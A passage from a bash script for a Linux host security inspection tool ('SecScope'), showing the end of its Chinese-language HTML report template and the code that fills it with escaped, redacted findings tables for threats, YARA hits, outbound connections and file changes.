h2{font-size:18px}.hint{max-width:1000px}.stat-bar,.change-stats{gap:1px;background:var(--line);border:1px solid var(--line)}.st,.change-stat{background:#fff;border-top-width:4px;border-radius:0}.table-wrap{border-color:var(--line);border-radius:3px}.tbl{font-size:13px}.tbl th{background:#edf2f4;color:#435159;border-bottom:1px solid #cbd5da;position:sticky;top:101px;z-index:2}.tbl th,.tbl td{padding:9px 10px}.tbl tbody tr:hover>td{background:#f6fafb}.tag,.confidence{border-radius:3px}.evidence-row td{background:#f2f6f7}.evidence-layout pre{border-color:#d5dfe3;background:#fff;border-radius:2px}.evidence-toggle{color:#096f79;font-weight:700}.raw-list{columns:3;background:var(--soft);border:1px solid var(--line);padding:12px 12px 12px 34px}.footer{border-top:1px solid var(--line);margin-top:20px;padding-top:18px}.hidden-by-filter{display:none!important}
@media(max-width:980px){.executive{grid-template-columns:1fr 1fr}.executive-lead{grid-column:1/-1}.executive-metric{border-left:0;border-top:1px solid var(--line)}.executive-metric:nth-child(3){border-left:1px solid var(--line)}.overview{grid-template-columns:1fr 1fr}.overview-card:nth-child(2){border-right:0}.overview-card:nth-child(-n+2){border-bottom:1px solid var(--line)}.raw-list{columns:2}}
@media(max-width:620px){.topbar{padding:20px 16px}.brandmark{display:none}.verdict-tag{text-align:left}.report-nav-inner,.wrap{padding-left:12px;padding-right:12px}.report-nav-inner{overflow-x:auto}.executive{grid-template-columns:1fr}.executive-lead{grid-column:auto}.executive-metric,.executive-metric:nth-child(3){border-left:0;border-top:1px solid var(--line)}.overview{grid-template-columns:1fr}.overview-card{border-right:0;border-bottom:1px solid var(--line)}.overview-card:last-child{border-bottom:0}.searchbox{top:44px}.section{padding:21px 0}.stat-bar,.change-stats{grid-template-columns:repeat(2,minmax(0,1fr))}.evidence-layout{grid-template-columns:1fr}.raw-list{columns:1}.tbl th{top:98px}}
@media print{body{font-size:10pt}.topbar{background:#fff!important;color:#000;border-bottom:2px solid #000;padding:12px 0}.brand-kicker,.meta{color:#333}.brandmark,.report-nav,.searchbox,.evidence-toggle{display:none!important}.wrap{max-width:none;padding:8px 0}.executive,.overview,.integrity-note,.section{break-inside:avoid}.section{padding:15px 0}.evidence-row[hidden]{display:table-row}.tbl th{position:static}.raw-list{columns:2}.verdict-tag{color:#000;background:#fff!important;border:1px solid #555}.footer{color:#333}}
/* Static table headers avoid painting empty-result rows above the header. */
.tbl th{position:static!important;top:auto!important;z-index:auto!important}
</style></head><body><header class="topbar"><div class="topline"><div class="brandline"><div class="brandmark">SS</div><div><div class="brand-kicker">SECSCOPE / HOST INSPECTION</div><h1>Linux 主机安全巡检报告</h1><div class="meta">OS_PLACEHOLDER · 内核 KERNEL_PLACEHOLDER · 主机角色 HOST_ROLE_PLACEHOLDER · Profile PROFILE_PLACEHOLDER<br>开始时间 TS_PLACEHOLDER（UTC）</div></div></div><div class="verdict-tag CONCLUSION_CLASS">CONCLUSION_TEXT</div></div></header><nav class="report-nav" aria-label="报告导航"><div class="report-nav-inner"><a href="#summary">执行摘要</a><a href="#changes">本轮变化</a><a href="#threats">安全威胁</a><a href="#anomalies">待研判异常</a><a href="#connections">异常外连</a><a href="#yara">YARA</a><a href="#files">文件行为</a><a href="#visibility">检测可见性</a><a href="#evidence">证据索引</a></div></nav><main class="wrap">
<section id="summary" class="executive" aria-label="执行摘要"><div class="executive-lead"><span class="executive-label">本轮结论</span><strong class="executive-value">CONCLUSION_TEXT</strong><span class="executive-note">结论仅依据本轮已采集证据；可见性缺口与未安装数据源单独列示。</span></div><div class="executive-metric"><span class="executive-label">安全威胁</span><strong class="executive-value">THREAT_TOTAL_VALUE</strong><span class="executive-note">严重 THREAT_CRITICAL_VALUE · 高危 THREAT_HIGH_VALUE</span></div><div class="executive-metric"><span class="executive-label">本轮变化</span><strong class="executive-value">CHANGE_TOTAL_VALUE</strong><span class="executive-note">新增、变化、再次出现或恢复</span></div><div class="executive-metric"><span class="executive-label">检查覆盖</span><strong class="executive-value">COVERAGE_PLACEHOLDER%</strong><span class="executive-note">MODULE_COUNT_VALUE 个模块已记录状态</span></div></section>
<div class="overview"><div class="overview-card"><span>主机</span><b>HOSTNAME_PLACEHOLDER</b></div><div class="overview-card"><span>本机 IP</span><b>LOCAL_IPS_PLACEHOLDER</b></div><div class="overview-card"><span>检查覆盖率</span><b>COVERAGE_PLACEHOLDER%</b></div><div class="overview-card"><span>状态库 / 认证画像</span><b>STATE_PLACEHOLDER / AUTH_PROFILE_PLACEHOLDER</b></div></div>
<div class="integrity-note"><strong>证据完整性提示：</strong>HTML 只是展示层，不能替代原始证据。移动或分享时必须保留同目录的 <code>raw/</code>、<code>findings.json</code>、<code>raw-manifest.json</code>、<code>report-manifest.json</code> 和 <code>report.sha256</code>；在报告目录执行 <code>bash verify-report.sh</code> 可检查缺失或篡改。</div>
<section class="searchbox"><input id="report-search" type="search" autocomplete="off" placeholder="搜索端口、IP、进程、规则编号或哈希"><select id="report-severity"><option value="">全部级别</option><option value="critical">严重</option><option value="high">高危</option><option value="medium">中危</option><option value="low">低危</option><option value="observe">观察</option></select><select id="report-confidence"><option value="">全部可信度</option><option value="high">高可信</option><option value="medium">中可信</option><option value="low">低可信</option></select><select id="report-section"><option value="">全部模块</option><option value="changes">本轮变化</option><option value="threat">安全威胁</option><option value="anomaly">待研判异常</option><option value="yara">YARA 命中</option><option value="rat">RAT / Loader</option><option value="baseline">配置基线</option><option value="trust">软件信任缺口</option><option value="observation">运行观察</option><option value="files">文件行为</option><option value="endpoint">终端安全</option><option value="priority">处理建议</option><option value="modules">模块覆盖</option><option value="ioc">IOC</option><option value="raw">原始证据</option></select><button id="report-search-clear" type="button">重置</button><span id="report-search-result" class="search-result"></span></section>
<section class="section"><div class="section-hd"><h2>防病毒 / 终端安全软件</h2></div><p class="hint">根据本机程序、systemd 服务和可用病毒库识别；异常状态进入建议优先处理，不计入高危威胁数。</p><div class="table-wrap"><table class="tbl"><thead><tr><th>产品</th><th>运行状态</th><th>病毒库或能力状态</th><th>识别来源</th></tr></thead><tbody>ENDPOINT_TABLE</tbody></table></div></section>
<section class="section"><div class="section-hd"><h2>建议优先处理</h2></div><p class="hint">运维和待研判建议，不计入严重或高危威胁数量。</p><div class="table-wrap"><table class="tbl"><thead><tr><th>项目</th><th>当前状态</th><th>建议</th></tr></thead><tbody>PRIORITY_TABLE</tbody></table></div></section>
<section id="changes" class="section"><div class="section-hd"><h2>本轮变化</h2></div>CHANGE_STATS<p class="hint">仅展示优先级最高的 10 项，完整内容请查看威胁指标和配置基线。</p><div class="table-wrap">CHANGE_TABLE</div></section>
<section id="threats" class="section"><div class="section-hd"><h2>已确认或高置信安全威胁</h2><span class="badge threat">优先研判</span></div>THREAT_STATS<p class="hint">只有高信号证据进入此区；严重度仍表示处置优先级。</p><div class="table-wrap">THREAT_TABLE</div></section>
<section id="anomalies" class="section"><div class="section-hd"><h2>待研判安全异常</h2></div><p class="hint">低到中可信信号，不等同于已经确认入侵。</p><div class="table-wrap">ANOMALY_TABLE</div></section>
<section class="section"><div class="section-hd"><h2>配置基线</h2><span class="badge baseline">加固建议</span></div>BASELINE_STATS<p class="hint">以下为安全配置建议，不单独代表主机已经被入侵。</p><div class="table-wrap">BASELINE_TABLE</div></section>
<section class="section"><div class="section-hd"><h2>软件信任缺口</h2></div><p class="hint">缺少包归属、签名或受支持状态需要核验，但不能单凭未知状态判定恶意。</p><div class="table-wrap">TRUST_TABLE</div></section>
<section class="section"><div class="section-hd"><h2>运行 / 性能观察</h2></div><div class="table-wrap">OBSERVATION_TABLE</div></section>
<section id="connections" class="section"><div class="section-hd"><h2>异常外连</h2></div><p class="hint">连接组合基线：exe_sha256 + exe_path + user + dst_ip + dst_port；新增组合仅作为本地历史候选，不进行外部情报查询。</p><div class="table-wrap">ABNORMAL_CONNECTION_TABLE</div></section>
<section id="yara" class="section"><div class="section-hd"><h2>YARA 命中</h2></div><p class="hint">规则 meta 决定严重度和可信度；命中结果已关联文件变化、Web 请求、运行进程、网络、持久化及容器上下文。</p><div class="table-wrap">YARA_TABLE</div></section>
<section id="files" class="section"><div class="section-hd"><h2>可疑文件行为</h2></div><p class="hint">新增、修改、移动和删除文件均保留动作、大小、MD5、SHA-256、关联进程、关联网络连接和触发原因。</p><div class="table-wrap">FILE_TABLE</div></section>
<section class="section"><details class="section-fold"><summary>组件版本与离线支持状态</summary><div class="table-wrap">COMPONENT_TABLE</div></details></section>
<section id="visibility" class="section"><div class="section-hd"><h2>检测可见性</h2></div><p>VISIBILITY_TEXT</p><div class="table-wrap">VISIBILITY_TABLE</div></section>
<section class="section"><details class="section-fold"><summary>模块覆盖</summary><div class="table-wrap">MODULE_TABLE</div></details></section>
<section class="section"><details class="section-fold"><summary>IOC 指标</summary><div id="ioc-area"></div></details></section>
<section id="evidence" class="section"><details class="section-fold"><summary>原始证据索引</summary><ul class="raw-list">RAW_ROWS</ul></details></section>
<div class="footer">SecScope Linux vSCRIPT_VER · TS_PLACEHOLDER UTC · 原始证据目录 raw/</div></main><script>
(function(){var d=document.getElementById('ioc-area'),iocs=[];IOC_DATA_PLACEHOLDER;if(iocs.length===0){d.innerHTML='<div class="empty-state">无 IOC 指标</div>'}else{var h='<div class="table-wrap"><table class="tbl"><thead><tr><th>类型</th><th>值</th><th>上下文</th></tr></thead><tbody>';iocs.forEach(function(i){h+='<tr data-search-item="1" data-section="ioc"><td>'+i.type+'</td><td><code>'+i.value+'</code></td><td>'+i.context+'</td></tr>'});d.innerHTML=h+'</tbody></table></div>'}})();
(function(){var input=document.getElementById('report-search'),severity=document.getElementById('report-severity'),confidence=document.getElementById('report-confidence'),section=document.getElementById('report-section'),clear=document.getElementById('report-search-clear'),result=document.getElementById('report-search-result');function apply(){var nodes=document.querySelectorAll('[data-search-item="1"]'),q=(input.value||'').toLowerCase().replace(/^\s+|\s+$/g,''),terms=q?q.split(/\s+/):[],sev=severity.value,conf=confidence.value,sec=section.value,shown=0;for(var i=0;i<nodes.length;i++){var node=nodes[i],text=((node.textContent||node.innerText||'')+' '+(node.getAttribute('data-search')||'')).toLowerCase(),visible=true;if(sev&&node.getAttribute('data-severity')!==sev)visible=false;if(conf&&node.getAttribute('data-confidence')!==conf)visible=false;if(sec&&node.getAttribute('data-section')!==sec)visible=false;for(var j=0;visible&&j<terms.length;j++)if(text.indexOf(terms[j])<0)visible=false;node.classList.toggle('hidden-by-filter',!visible);if(!visible&&node.nextElementSibling&&node.nextElementSibling.classList.contains('evidence-row'))node.nextElementSibling.hidden=true;if(visible)shown++}result.textContent=(q||sev||conf||sec)?('找到 '+shown+' 条匹配'):('可搜索 '+nodes.length+' 条内容')}input.oninput=apply;severity.onchange=apply;confidence.onchange=apply;section.onchange=apply;clear.onclick=function(){input.value='';severity.value='';confidence.value='';section.value='';apply();input.focus()};var buttons=document.querySelectorAll('.evidence-toggle');for(var b=0;b<buttons.length;b++)buttons[b].onclick=function(){var row=document.getElementById(this.getAttribute('data-target'));row.hidden=!row.hidden;this.textContent=row.hidden?'查看证据':'收起证据'};apply()})();
</script></body></html>
HTM

    # 替换占位符
    local threat_stats_html=$(gen_stat_bar "$threat_critical" "$threat_high" "$threat_medium" "$threat_low")
    local baseline_stats_html=$(gen_stat_bar "$base_critical" "$base_high" "$base_medium" "$base_low")
    local change_total=$((LIFECYCLE_NEW + LIFECYCLE_CHANGED + LIFECYCLE_ESCALATED + LIFECYCLE_DEESCALATED + LIFECYCLE_REOPENED + LIFECYCLE_RESOLVED))
    local changed_total=$((LIFECYCLE_CHANGED + LIFECYCLE_ESCALATED + LIFECYCLE_DEESCALATED))
    local change_stats_html="<div class=\"change-stats\"><div class=\"change-stat\"><b>${change_total}</b>变化总数</div><div class=\"change-stat\"><b>${LIFECYCLE_NEW}</b>新增</div><div class=\"change-stat\"><b>${changed_total}</b>已变化</div><div class=\"change-stat\"><b>${LIFECYCLE_REOPENED}</b>再次出现</div><div class=\"change-stat\"><b>${LIFECYCLE_RESOLVED}</b>已恢复</div></div>"
    local local_ip_text="未获取"
    [ "${#LOCAL_ADDRESSES[@]}" -eq 0 ] || local_ip_text="${LOCAL_ADDRESSES[*]}"
    local empty_finding='<tr><td colspan="5"><div class="empty-state">本轮无此类发现</div></td></tr>'
    [ -n "$threat_rows" ] || threat_rows="$empty_finding"
    [ -n "$anomaly_rows" ] || anomaly_rows="$empty_finding"
    [ -n "$baseline_rows" ] || baseline_rows="$empty_finding"
    [ -n "$trust_rows" ] || trust_rows="$empty_finding"
    [ -n "$observation_rows" ] || observation_rows="$empty_finding"
    local finding_table_head='<thead><tr><th class="col-sev">级别</th><th class="col-sum">问题描述</th><th>可信度</th><th class="col-cat">类别</th><th class="col-act">详情</th></tr></thead>'
    local threat_table_html="<table class=\"tbl\">${finding_table_head}<tbody>${threat_rows}</tbody></table>"
    local anomaly_table_html="<table class=\"tbl\">${finding_table_head}<tbody>${anomaly_rows}</tbody></table>"
    local baseline_table_html="<table class=\"tbl\">${finding_table_head}<tbody>${baseline_rows}</tbody></table>"
    local trust_table_html="<table class=\"tbl\">${finding_table_head}<tbody>${trust_rows}</tbody></table>"
    local observation_table_html="<table class=\"tbl\">${finding_table_head}<tbody>${observation_rows}</tbody></table>"
    local abnormal_rows="" conn_idx
    for conn_idx in "${!ABNORMAL_CONN_PIDS[@]}"; do
        abnormal_rows+="$(printf '<tr data-search-item="1" data-section="network" data-severity="%s"><td><span class="tag tag-severity-%s">%s</span></td><td>%s</td><td><code>%s</code><br><small>%s<br>ppid=%s · service=%s</small></td><td>%s</td><td><code>%s</code></td><td>%s</td><td>%s</td><td><small>%s</small></td></tr>' \
            "$(printf '%s' "${ABNORMAL_CONN_SEVS[$conn_idx]}" | tr '[:upper:]' '[:lower:]')" "$(printf '%s' "${ABNORMAL_CONN_SEVS[$conn_idx]}" | tr '[:upper:]' '[:lower:]')" "$(html_esc "${ABNORMAL_CONN_SEVS[$conn_idx]}")" \
            "$(html_esc "${ABNORMAL_CONN_PIDS[$conn_idx]}")" "$(html_esc "${ABNORMAL_CONN_EXES[$conn_idx]}")" "$(html_esc "${ABNORMAL_CONN_CMDS[$conn_idx]}")" "$(html_esc "${ABNORMAL_CONN_PPIDS[$conn_idx]}")" "$(html_esc "${ABNORMAL_CONN_SERVICES[$conn_idx]}")" "$(html_esc "${ABNORMAL_CONN_USERS[$conn_idx]}")" "$(html_esc "${ABNORMAL_CONN_TARGETS[$conn_idx]}")" "$(html_esc "${ABNORMAL_CONN_NEW[$conn_idx]}")" "$(html_esc "${ABNORMAL_CONN_PACKAGES[$conn_idx]}")" "$(html_esc "${ABNORMAL_CONN_RAW[$conn_idx]}")")"
    done
    [ -n "$abnormal_rows" ] || abnormal_rows='<tr><td colspan="8"><div class="empty-state">本轮未发现历史未见连接组合或新监听端口</div></td></tr>'
    local abnormal_table_html="<table class=\"tbl\"><thead><tr><th>级别</th><th>PID</th><th>运行程序 / 命令行</th><th>用户</th><th>目标 IP:端口</th><th>是否新增</th><th>包归属</th><th>原始证据</th></tr></thead><tbody>${abnormal_rows}</tbody></table>"
    local file_rows="" file_idx file_priority_label
    for file_idx in "${!FILE_BEHAVIOR_PATHS[@]}"; do
        file_priority_label=" · 优先分 ${FILE_BEHAVIOR_PRIORITY_SCORES[$file_idx]:-0} · ${FILE_BEHAVIOR_PRIORITY_REASONS[$file_idx]:-DEFAULT}"
        file_rows+="$(printf '<tr data-search-item="1" data-section="files" data-severity="%s" data-confidence="%s"><td><span class="tag tag-severity-%s">%s</span></td><td><code>%s</code><br><small>%s</small></td><td>%s</td><td><code class="copy-hash">%s</code><br><code>%s</code></td><td><small>%s</small></td><td>%s</td></tr>' \
            "$(printf '%s' "${FILE_BEHAVIOR_SEVS[$file_idx]}" | tr '[:upper:]' '[:lower:]')" "$(printf '%s' "${FILE_BEHAVIOR_CONFIDENCES[$file_idx]}" | tr '[:upper:]' '[:lower:]')" \
            "$(printf '%s' "${FILE_BEHAVIOR_SEVS[$file_idx]}" | tr '[:upper:]' '[:lower:]')" "$(html_esc "$(severity_label "${FILE_BEHAVIOR_SEVS[$file_idx]}")")" \
            "$(html_esc "${FILE_BEHAVIOR_PATHS[$file_idx]}")" "$(html_esc "${FILE_BEHAVIOR_ACTIONS[$file_idx]} · ${FILE_BEHAVIOR_SIZES[$file_idx]} bytes${file_priority_label}")" "$(html_esc "$(confidence_label "${FILE_BEHAVIOR_CONFIDENCES[$file_idx]}")")" \
            "$(html_esc "${FILE_BEHAVIOR_MD5[$file_idx]}")" "$(html_esc "${FILE_BEHAVIOR_SHA256[$file_idx]}")" "$(html_esc "${FILE_BEHAVIOR_CONTEXTS[$file_idx]}")" "$(html_esc "${FILE_BEHAVIOR_REASONS[$file_idx]}")")"
    done
    [ -n "$file_rows" ] || file_rows='<tr><td colspan="5"><div class="empty-state">本轮无文件行为变化，或首轮仅建立基线</div></td></tr>'
    local file_table_html="<table class=\"tbl\"><thead><tr><th>级别</th><th>文件 / 动作</th><th>可信度</th><th>MD5 / SHA-256</th><th>关联进程 / 网络</th><th>触发原因</th></tr></thead><tbody>${file_rows}</tbody></table>"
    local yara_rows="" yara_target yara_rule yara_namespace yara_severity yara_confidence yara_category yara_family yara_mitre yara_description yara_tags yara_metadata yara_sha yara_md5 yara_package yara_action yara_priority_score yara_priority_reasons yara_web_root yara_web_access yara_process yara_network yara_persistence yara_container yara_kubernetes yara_domains yara_requested_type yara_reason yara_context
    if [ -r "${RAW_DIR}/yara-findings.tsv" ]; then
        while IFS=$'\037' read -r yara_target yara_rule yara_namespace yara_severity yara_confidence yara_category yara_family yara_mitre yara_description yara_tags yara_metadata yara_sha yara_md5 yara_package yara_action yara_priority_score yara_priority_reasons yara_web_root yara_web_access yara_process yara_network yara_persistence yara_container yara_kubernetes yara_domains yara_requested_type yara_reason; do
            [ "$yara_target" = target ] && continue
            [ -n "$yara_target$yara_rule" ] || continue
            yara_context="web=${yara_web_access:-none}; process=${yara_process:-none}; network=${yara_network:-none}; persistence=${yara_persistence:-none}; container=${yara_container:-none}; kubernetes=${yara_kubernetes:-none}"
            yara_rows+="$(printf '<tr data-search-item="1" data-section="yara" data-severity="%s" data-confidence="%s"><td><span class="tag tag-severity-%s">%s</span><br><span class="confidence confidence-%s">%s</span></td><td><code>%s:%s</code><br><small>category=%s · family=%s · MITRE=%s<br>%s</small></td><td><code>%s</code><br><small>package=%s · web_root=%s</small></td><td><code>%s</code><br><code>%s</code></td><td>%s<br><small>priority=%s (%s)</small></td><td><small>%s</small></td></tr>' \
                "$(printf '%s' "$yara_severity" | tr '[:upper:]' '[:lower:]')" "$(printf '%s' "$yara_confidence" | tr '[:upper:]' '[:lower:]')" "$(printf '%s' "$yara_severity" | tr '[:upper:]' '[:lower:]')" "$(html_esc "$yara_severity")" "$(printf '%s' "$yara_confidence" | tr '[:upper:]' '[:lower:]')" "$(html_esc "$yara_confidence")" \
                "$(html_esc "$yara_namespace")" "$(html_esc "$yara_rule")" "$(html_esc "$yara_category")" "$(html_esc "$yara_family")" "$(html_esc "$yara_mitre")" "$(html_esc "$yara_description")" \
                "$(html_esc "$(redact_text "$yara_target")")" "$(html_esc "$yara_package")" "$(html_esc "$(redact_text "$yara_web_root")")" "$(html_esc "$yara_md5")" "$(html_esc "$yara_sha")" \
                "$(html_esc "$yara_action")" "$(html_esc "$yara_priority_score")" "$(html_esc "$yara_priority_reasons")" "$(html_esc "$(redact_text "$yara_context")")")"
        done < <(tr '\t' '\037' < "${RAW_DIR}/yara-findings.tsv")
    fi
    [ -n "$yara_rows" ] || yara_rows='<tr><td colspan="6"><div class="empty-state">本轮无 YARA 命中，或该模式未启用 YARA</div></td></tr>'
    local yara_table_html="<table class=\"tbl\"><thead><tr><th>级别 / 可信度</th><th>规则 / meta</th><th>目标文件</th><th>MD5 / SHA-256</th><th>文件变化</th><th>关联上下文</th></tr></thead><tbody>${yara_rows}</tbody></table>"
    local component_rows="" component_idx
    for component_idx in "${!COMPONENT_NAMES[@]}"; do
        component_rows+="$(printf '<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>' "$(html_esc "${COMPONENT_NAMES[$component_idx]}")" "$(html_esc "${COMPONENT_VERSIONS[$component_idx]}")" "$(html_esc "${COMPONENT_SOURCES[$component_idx]}")" "$(html_esc "${COMPONENT_SUPPORT[$component_idx]}")")"
    done
    [ -n "$component_rows" ] || component_rows='<tr><td colspan="4"><div class="empty-state">未采集到组件版本</div></td></tr>'
    local component_table_html="<table class=\"tbl\"><thead><tr><th>组件</th><th>版本</th><th>来源</th><th>支持状态</th></tr></thead><tbody>${component_rows}</tbody></table>"
    local visibility_text="模块覆盖率 ${RUN_COVERAGE}%；事件窗口 ${EVENT_WINDOW_MINUTES} 分钟，归一化 ${EVENT_COUNT} 条（Falco ${EVENT_FALCO_COUNT} / audit ${EVENT_AUDIT_COUNT}）；YARA 模式 ${YARA_MODE}，扫描 ${YARA_SCANNED} 个文件、命中 ${YARA_MATCHED} 条、超时 ${YARA_TIMEOUT_COUNT}、错误 ${YARA_ERROR_COUNT}、提升 ${YARA_PROMOTED_FINDINGS} 条；Web 日志采样 ${WEB_ACCESS_LOG_LINES} 条，完整解析 ${WEB_ACCESS_LOG_PARSED} 条、部分解析 ${WEB_ACCESS_LOG_FAILED} 条；容器上下文 ${CONTAINER_CONTEXT_STATUS}（${CONTAINER_CONTEXT_COUNT} 个进程），Kubernetes 上下文 ${KUBERNETES_CONTEXT_STATUS}（${KUBERNETES_CONTEXT_COUNT} 条）；文件监控 ${FILE_SCAN_STATUS}，扫描 ${FILE_SCAN_SCANNED} 个文件，其中小文件优先 ${FILE_SCAN_SMALL_PRIORITY} 个、新增小文件 ${FILE_SCAN_ADDED_SMALL} 个、复用哈希 ${FILE_SCAN_HASH_REUSED} 个、新计算哈希 ${FILE_SCAN_HASH_SUCCESS} 个、失败 ${FILE_SCAN_HASH_FAILED} 个；最近补丁状态 ${PATCH_STATUS}${PATCH_LATEST:+，最近记录 ${PATCH_LATEST}}。缺失数据源只表示可见性缺口，不代表安全。"
    local visibility_table_html="<table class=\"tbl\"><thead><tr><th>数据源</th><th>状态</th><th>说明</th></tr></thead><tbody>$(printf '<tr><td>snapshot</td><td>%s</td><td>/proc、ss、文件基线与本机日志</td></tr><tr><td>auditd</td><td>%s</td><td>execve/connect/open-write/rename-unlink/chmod/ptrace/setns 等</td></tr><tr><td>Falco</td><td>%s</td><td>优先读取既有 JSON 日志，不自动安装或改规则</td></tr><tr><td>YARA</td><td>%s</td><td>仅在命令和组织规则文件均可用时扫描</td></tr><tr><td>IMA</td><td>%s</td><td>只读检查 runtime measurements 可见性</td></tr><tr><td>Web access</td><td>%s</td><td>Nginx/Apache/OpenResty/Caddy/Tomcat/JSON；解析 %s，部分 %s</td></tr><tr><td>Container</td><td>%s</td><td>cgroup、runtime/container/pod ID 与 namespace inode</td></tr><tr><td>Kubernetes</td><td>%s</td><td>运行时 Socket、ServiceAccount、宿主路径与特权上下文</td></tr><tr><td>RAT engine</td><td>%s</td><td>PE/ELF + 稳定进程实体 + 网络/内存/持久化图</td></tr><tr><td>Threat intel</td><td>%s</td><td>永久离线：仅本地 IOC/白名单/历史基线；不存在 HTTP 或 DNS 查询能力</td></tr>' "$EVENT_SOURCE_SNAPSHOT" "$EVENT_SOURCE_AUDITD" "$EVENT_SOURCE_FALCO" "$EVENT_SOURCE_YARA" "$EVENT_SOURCE_IMA" "$WEB_ACCESS_LOG_STATUS" "$WEB_ACCESS_LOG_PARSED" "$WEB_ACCESS_LOG_FAILED" "$CONTAINER_CONTEXT_STATUS" "$KUBERNETES_CONTEXT_STATUS" "$RAT_STATUS" "$THREAT_INTEL_STATUS")</tbody></table>"
    [ -z "$change_rows" ] && change_rows='<tr><td colspan="3"><div class="empty-state">本轮无新增、升级、变化、重开或恢复项</div></td></tr>'
    local change_table_html="<table class=\"tbl\"><thead><tr><th>状态</th><th>发现</th><th>级别</th></tr></thead><tbody>${change_rows}</tbody></table>"

    # 注入 IOC 数据
    local ioc_js=""
    local ioc_idx=0
    for ioc in "${IOCS[@]}"; do
        local t=$(js_quote "$(html_esc "${IOC_TYPES[$ioc_idx]}")")
        local v=$(js_quote "$(html_esc "$(redact_text "${IOC_VALUES[$ioc_idx]}")")")
        local c=$(js_quote "$(html_esc "$(redact_text "${IOC_CONTEXTS[$ioc_idx]}")")")
        ioc_js+="iocs.push({type:${t},value:${v},context:${c}});"
        ioc_idx=$((ioc_idx + 1))
    done
    if ! replace_html_tokens "$HTML_FILE" \
        "HOSTNAME_PLACEHOLDER" "$(html_esc "$HOSTNAME")" \
        "LOCAL_IPS_PLACEHOLDER" "$(html_esc "$local_ip_text")" \
        "OS_PLACEHOLDER" "$(html_esc "$OS_NAME")" \
        "KERNEL_PLACEHOLDER" "$(html_esc "$KERNEL_VER")" \
        "TS_PLACEHOLDER" "$(html_esc "$TIMESTAMP")" \
        "HOST_ROLE_PLACEHOLDER" "$(html_esc "$(host_role_label "$HOST_ROLE")")" \
        "PROFILE_PLACEHOLDER" "$(html_esc "$SCAN_PROFILE")" \
        "COVERAGE_PLACEHOLDER" "$RUN_COVERAGE" \
        "THREAT_TOTAL_VALUE" "$((threat_critical + threat_high + threat_medium + threat_low))" \
        "THREAT_CRITICAL_VALUE" "$threat_critical" \
        "THREAT_HIGH_VALUE" "$threat_high" \
        "CHANGE_TOTAL_VALUE" "$change_total" \
        "MODULE_COUNT_VALUE" "${#MODULE_IDS[@]}" \
        "STATE_PLACEHOLDER" "$(html_esc "$(state_health_label "$STATE_HEALTH")")" \
        "AUTH_PROFILE_PLACEHOLDER" "$(html_esc "$(state_health_label "$AUTH_PROFILE_HEALTH")")" \
        "CONCLUSION_CLASS" "$v_cls" \
        "CONCLUSION_TEXT" "$(html_esc "$v_text")" \
        "SCRIPT_VER" "$(html_esc "$SCRIPT_VERSION")" \
        "THREAT_STATS" "$threat_stats_html" \
        "THREAT_TABLE" "$threat_table_html" \
        "ANOMALY_TABLE" "$anomaly_table_html" \
        "BASELINE_STATS" "$baseline_stats_html" \
        "BASELINE_TABLE" "$baseline_table_html" \
        "TRUST_TABLE" "$trust_table_html" \
        "OBSERVATION_TABLE" "$observation_table_html" \
        "FILE_TABLE" "$file_table_html" \
        "YARA_TABLE" "$yara_table_html" \
        "ABNORMAL_CONNECTION_TABLE" "$abnormal_table_html" \
        "COMPONENT_TABLE" "$component_table_html" \
        "VISIBILITY_TEXT" "$(html_esc "$visibility_text")" \
        "VISIBILITY_TABLE" "$visibility_table_html" \
        "CHANGE_STATS" "$change_stats_html" \
        "CHANGE_TABLE" "$change_table_html" \
        "ENDPOINT_TABLE" "$endpoint_rows" \
        "PRIORITY_TABLE" "$priority_rows" \
        "MODULE_TABLE" "$module_table_html" \
        "RAW_ROWS" "$raw_rows" \
        "IOC_DATA_PLACEHOLDER" "$ioc_js"; then
        log_error "HTML 模板替换失败"
        return 1
    fi

    if [ ! -s "$HTML_FILE" ] || ! grep -q '<table class="tbl"' "$HTML_FILE" || ! grep -q '</html>' "$HTML_FILE" || \
       LC_ALL=C grep -Eq '[A-Z][A-Z0-9_]*(PLACEHOLDER|_VALUE)' "$HTML_FILE"; then
        log_error "HTML 报告生成失败或结构不完整"
        return 1
    fi
}

#==============================================================================

generate_report_legacy() {
    local legacy_verdict
    legacy_verdict=$(verdict_text)
    generate_html_report "$legacy_verdict" || return 1
    chmod 600 "$HTML_FILE" || return 1
    log_info "HTML 报告已保存至: ${HTML_FILE}"
}
scan_visibility_incomplete() {
    local status_file_status
    case "$STATIC_CANDIDATE_STATUS" in PARTIAL|UNAVAILABLE) return 0 ;; esac
    for status_file_status in "${MODULE_STATUSES[@]}"; do
        case "$status_file_status" in PARTIAL|FAILED) return 0 ;; esac
    done
    if [ "$PROFILE_YARA_ENABLED" = true ]; then
        [ "$EVENT_SOURCE_YARA" = AVAILABLE ] || return 0
        [ "${YARA_RULES_LOADED:-0}" -gt 0 ] || return 0
        [ "${YARA_ERROR_COUNT:-0}" -eq 0 ] && [ "${YARA_TIMEOUT_COUNT:-0}" -eq 0 ] || return 0
    fi
    if [ -r "${RAW_DIR}/static-coverage.jsonl" ] && command -v python3 >/dev/null 2>&1; then
        python3 - "${RAW_DIR}/static-coverage.jsonl" <<'PY' >/dev/null 2>&1 || return 0
import json, sys
rows=[]
for line in open(sys.argv[1], encoding="utf-8", errors="replace"):
    try: rows.append(json.loads(line))
    except ValueError: pass
summary=next((x for x in reversed(rows) if x.get("summary")), {})
expected=int(summary.get("expected_files",0) or 0)
scanned=int(summary.get("scanned_files",summary.get("selected",0)) or 0)
skipped=int(summary.get("skipped_files",max(0,expected-scanned)) or 0)
errors=int(summary.get("error_count",0) or 0)
status=str(summary.get("status","SUCCESS")).upper()
raise SystemExit(0 if expected == scanned and skipped == 0 and errors == 0 and status in {"SUCCESS","COMPLETE"} else 1)
PY
    fi
    return 1
}

verdict_text() {
    local incomplete_suffix=""
    scan_visibility_incomplete && incomplete_suffix='；扫描覆盖为 PARTIAL/INCONCLUSIVE'
    if [ "$THREAT_CRITICAL" -gt 0 ]; then
        printf '疑似入侵 - 发现 %s 个严重威胁指标%s' "$THREAT_CRITICAL" "$incomplete_suffix"
    elif [ "$THREAT_HIGH" -gt 2 ]; then
        printf '高度可疑 - 发现 %s 个高危威胁指标%s' "$THREAT_HIGH" "$incomplete_suffix"
    elif [ "$THREAT_HIGH" -gt 0 ]; then
        printf '存在可疑项 - 发现 %s 个高危威胁指标%s' "$THREAT_HIGH" "$incomplete_suffix"
    elif [ "$THREAT_MEDIUM" -gt 0 ]; then
        printf '需关注 - 发现 %s 个中等威胁指标%s' "$THREAT_MEDIUM" "$incomplete_suffix"
